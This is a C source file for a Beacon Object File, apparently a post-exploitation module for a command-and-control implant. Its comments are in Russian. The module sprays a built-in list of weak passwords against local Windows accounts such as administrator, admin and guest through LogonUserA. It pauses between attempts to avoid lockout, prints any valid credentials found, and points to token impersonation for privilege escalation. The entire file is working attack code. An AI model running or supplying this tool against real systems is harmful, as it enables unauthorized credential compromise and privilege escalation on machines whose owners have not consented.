// bof_password_spray.c — password spray атака на локальные учетные записи.
//
// Пробует список паролей против локальных пользователей через LogonUser.
// Полезно для privilege escalation - поиск слабых паролей локальных admin'ов.
// Осторожно с lockout policy - делает паузы между попытками.

#include "..\bof_api.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LogonUserA(LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);

#define LOGON32_LOGON_NETWORK 3
#define LOGON32_PROVIDER_DEFAULT 0

static const char* common_passwords[] = {
    "password",
    "Password",
    "Password1",
    "Password123",
    "admin",
    "administrator",
    "123456",
    "qwerty",
    "welcome",
    "Welcome1",
    "",  // empty password
    NULL
};

static const char* local_users[] = {
    "administrator",
    "admin",
    "guest",
    "user",
    NULL
};

static int test_credentials(const char* username, const char* password) {
    HANDLE token;
    BOOL success = ADVAPI32$LogonUserA(
        username,
        ".",  // local machine
        password,
        LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT,
        &token
    );

    if (success) {
        KERNEL32$CloseHandle(token);
        return 1;
    }

    DWORD error = KERNEL32$GetLastError();

    // Log specific interesting errors
    if (error == 1326) { // ERROR_LOGON_FAILURE
        // Normal failure - wrong password
        return 0;
    } else if (error == 1331) { // ERROR_ACCOUNT_RESTRICTION
        BeaconPrintf(CALLBACK_OUTPUT, "[spray] %s: account disabled/restricted\n", username);
        return 0;
    } else if (error == 1909) { // ERROR_ACCOUNT_LOCKED_OUT
        BeaconPrintf(CALLBACK_OUTPUT, "[spray] %s: account locked out!\n", username);
        return 0;
    } else if (error == 1330) { // ERROR_PASSWORD_EXPIRED
        BeaconPrintf(CALLBACK_OUTPUT, "[spray] %s: password expired (but valid!)\n", username);
        return 0;
    }

    return 0;
}

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    // Optional: custom username list
    int len;
    char* custom_user = BeaconDataExtract(&parser, &len);

    BeaconPrintf(CALLBACK_OUTPUT, "[password_spray] Starting local password spray\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[password_spray] WARNING: Monitor for account lockouts\n\n");

    const char** user_list = local_users;
    const char* single_user[2] = {NULL, NULL};

    if (custom_user && len > 0) {
        // Use custom username
        static char user_buf[64];
        for (int i = 0; i < len && i < 63; i++) {
            user_buf[i] = custom_user[i];
        }
        user_buf[len < 63 ? len : 63] = '\0';
        single_user[0] = user_buf;
        user_list = single_user;
        BeaconPrintf(CALLBACK_OUTPUT, "[password_spray] Testing only user: %s\n\n", user_buf);
    }

    int total_attempts = 0;
    int successful = 0;

    for (int u = 0; user_list[u] != NULL; u++) {
        const char* username = user_list[u];

        for (int p = 0; common_passwords[p] != NULL; p++) {
            const char* password = common_passwords[p];
            const char* pwd_display = password[0] ? password : "(empty)";

            BeaconPrintf(CALLBACK_OUTPUT, "[spray] Trying %s : %s ... ", username, pwd_display);

            if (test_credentials(username, password)) {
                BeaconPrintf(CALLBACK_OUTPUT, "SUCCESS!\n");
                BeaconPrintf(CALLBACK_OUTPUT, "[spray] ** FOUND: %s : %s **\n", username, pwd_display);
                successful++;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "failed\n");
            }

            total_attempts++;

            // Sleep between attempts to avoid lockout
            KERNEL32$Sleep(2000);  // 2 second delay
        }

        // Longer sleep between users
        if (user_list[u + 1] != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[spray] Waiting 5 seconds before next user...\n");
            KERNEL32$Sleep(5000);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[password_spray] Completed: %d attempts, %d successful\n",
                 total_attempts, successful);

    if (successful > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[password_spray] Use 'make_token' or 'steal_token' to impersonate\n");
    }
}